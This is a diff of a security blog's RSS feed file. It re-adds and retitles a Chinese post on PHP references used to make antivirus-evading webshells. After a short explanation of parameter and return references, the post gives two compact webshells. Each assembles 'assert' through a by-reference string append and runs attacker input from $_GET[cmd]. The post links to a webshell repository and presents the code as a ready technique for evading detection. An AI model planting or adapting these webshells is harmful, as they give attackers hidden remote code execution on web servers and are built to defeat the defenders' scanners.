@@ -5,9 +5,106 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 25 Apr 2017 22:46:18 +0800</pubDate>
-    <lastBuildDate>Tue, 25 Apr 2017 22:46:18 +0800</lastBuildDate>
+    <pubDate>Tue, 25 Apr 2017 22:50:43 +0800</pubDate>
+    <lastBuildDate>Tue, 25 Apr 2017 22:50:43 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
+    
+      <item>
+        <title>php中&amp;引用免杀webshell</title>
+        <description>&lt;h3 id=&quot;0x00-php中的&quot;&gt;0x00 php中的&amp;amp;&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.函数的参数引用
+&amp;lt;?php
+function test(&amp;amp;$a){ 
+    $a=$a+100; 
+    } 
+    $b=1; 
+    echo $b;//输出１ 
+    test($b);   //这里$b传递给函数的其实是$b的变量内容所处的内存地址,通过在函数里改变$a的值就可以改变$b的值了 
+    echo &quot;&amp;lt;br&amp;gt;&quot;; 
+    echo $b;//输出101
+?&amp;gt;
+
+2.函数的返回引用
+&amp;lt;?php
+function &amp;amp;test()
+{ 
+    static $b=0;//申明一个静态变量 
+    $b=$b+1; 
+    echo $b; 
+    return $b; 
+}
+
+$a=test();//这条语句会输出$b的值为１ 
+$a=5; 
+$a=test();//这条语句会输出$b的值为2
+$a=&amp;amp;test();//这条语句会输出$b的值为3,这句相当于$a=&amp;amp;$b;
+$a=5; 
+$a=test();//这条语句会输出$b的值为6
+?&amp;gt;
+
+理解参考:
+http://www.cnblogs.com/thinksasa/p/3334492.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;
+
+&lt;h4 id=&quot;a利用函数的参数引用免杀&quot;&gt;a)利用函数的参数引用免杀&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
+function foo(&amp;amp;$var)
+{
+    $var=$var.'t';
+}
+$a=&quot;asser&quot;;
+foo($a);
+$a($_GET[cmd]);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;b利用函数的返回引用免杀&quot;&gt;b)利用函数的返回引用免杀&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
+class talker{
+    public $data = 'Hi';
+    public function &amp;amp; get(){
+        return $this-&amp;gt;data;
+    }
+}
+
+$aa = new talker();
+$d = &amp;amp;$aa-&amp;gt;get();
+$d = $_GET[cmd];
+
+function foo(&amp;amp;$var)
+{
+    $var=$var.'t';
+}
+$a=&quot;asser&quot;;
+foo($a);
+$a($aa-&amp;gt;data);
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;本文代码下载&lt;br /&gt;
+&lt;a href=&quot;https://github.com/3xp10it/xwebshell/tree/master/php/%26&quot;&gt;download&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Tue, 25 Apr 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/04/25/php%E4%B8%AD&%E5%BC%95%E7%94%A8%E5%85%8D%E6%9D%80/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/04/25/php%E4%B8%AD&%E5%BC%95%E7%94%A8%E5%85%8D%E6%9D%80/</guid>
+        
+        <category>php</category>
+        
+        <category>引用</category>
+        
+        <category>免杀</category>
+        
+        
+        <category>web</category>
+        
+      </item>
     
       <item>
         <title>c++中的&amp;的用法</title>
@@ -124,103 +221,6 @@ g++ 2.cpp -o 2
         
         
         <category>auxilary</category>
-        
-      </item>
-    
-      <item>
-        <title>\&amp;引用免杀webshell</title>
-        <description>&lt;h3 id=&quot;0x00-php中的&quot;&gt;0x00 php中的&amp;amp;&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.函数的参数引用
-&amp;lt;?php
-function test(&amp;amp;$a){ 
-    $a=$a+100; 
-    } 
-    $b=1; 
-    echo $b;//输出１ 
-    test($b);   //这里$b传递给函数的其实是$b的变量内容所处的内存地址,通过在函数里改变$a的值就可以改变$b的值了 
-    echo &quot;&amp;lt;br&amp;gt;&quot;; 
-    echo $b;//输出101
-?&amp;gt;
-
-2.函数的返回引用
-&amp;lt;?php
-function &amp;amp;test()
-{ 
-    static $b=0;//申明一个静态变量 
-    $b=$b+1; 
-    echo $b; 
-    return $b; 
-}
-
-$a=test();//这条语句会输出$b的值为１ 
-$a=5; 
-$a=test();//这条语句会输出$b的值为2
-$a=&amp;amp;test();//这条语句会输出$b的值为3,这句相当于$a=&amp;amp;$b;
-$a=5; 
-$a=test();//这条语句会输出$b的值为6
-?&amp;gt;
-
-理解参考:
-http://www.cnblogs.com/thinksasa/p/3334492.html
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;
-
-&lt;h4 id=&quot;a利用函数的参数引用免杀&quot;&gt;a)利用函数的参数引用免杀&lt;/h4&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
-function foo(&amp;amp;$var)
-{
-    $var=$var.'t';
-}
-$a=&quot;asser&quot;;
-foo($a);
-$a($_GET[cmd]);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;b利用函数的返回引用免杀&quot;&gt;b)利用函数的返回引用免杀&lt;/h4&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
-class talker{
-    public $data = 'Hi';
-    public function &amp;amp; get(){
-        return $this-&amp;gt;data;
-    }
-}
-
-$aa = new talker();
-$d = &amp;amp;$aa-&amp;gt;get();
-$d = $_GET[cmd];
-
-function foo(&amp;amp;$var)
-{
-    $var=$var.'t';
-}
-$a=&quot;asser&quot;;
-foo($a);
-$a($aa-&amp;gt;data);
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;本文代码下载&lt;br /&gt;
-&lt;a href=&quot;https://github.com/3xp10it/xwebshell/tree/master/php/%26&quot;&gt;download&lt;/a&gt;&lt;/p&gt;
-</description>
-        <pubDate>Tue, 25 Apr 2017 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/web/2017/04/25/&%E5%BC%95%E7%94%A8%E5%85%8D%E6%9D%80webshell/</link>
-        <guid isPermaLink="true">http://localhost:4000/web/2017/04/25/&%E5%BC%95%E7%94%A8%E5%85%8D%E6%9D%80webshell/</guid>
-        
-        <category>php</category>
-        
-        <category>引用</category>
-        
-        <category>免杀</category>
-        
-        
-        <category>web</category>
         
       </item>
     
